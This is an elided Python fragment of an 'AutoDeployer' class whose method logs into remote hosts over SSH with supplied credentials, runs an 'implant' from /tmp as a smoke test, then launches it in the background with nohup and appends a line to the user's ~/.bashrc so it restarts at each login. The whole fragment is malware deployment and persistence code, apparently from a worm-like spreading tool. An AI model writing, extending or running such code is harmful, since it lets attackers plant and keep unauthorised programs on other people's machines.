...
class AutoDeployer:
    ...
    def try_ssh_deploy(self, host, username, password):
        ...
        try:
            ...
            # Smoke test: run the implant in the foreground for 10s.
            # Status 124 (timeout kill) proves it started and stayed alive.
            smoke = "cd /tmp && timeout 10 python3 %s >/dev/null 2>&1; echo RC:$?" % implant_name
            _, stdout, stderr = client.exec_command(smoke)
            stdout.channel.recv_exit_status()
            rc_out = stdout.read().decode().strip()
            exit_code = 124 if "RC:124" in rc_out else 1
            stderr_text = stderr.read().decode()[:200]

            # Only background + persist once the smoke test passed
            if exit_code == 124:
                client.exec_command("cd /tmp && nohup python3 %s > /dev/null 2>&1 &" % implant_name)
                persistence_cmd = 'echo "cd /tmp && python3 %s 2>/dev/null &" >> ~/.bashrc' % implant_name
                client.exec_command(persistence_cmd)
            else:
                print("[!] %s: implant smoke test failed (%s) %s" % (host, rc_out, stderr_text))
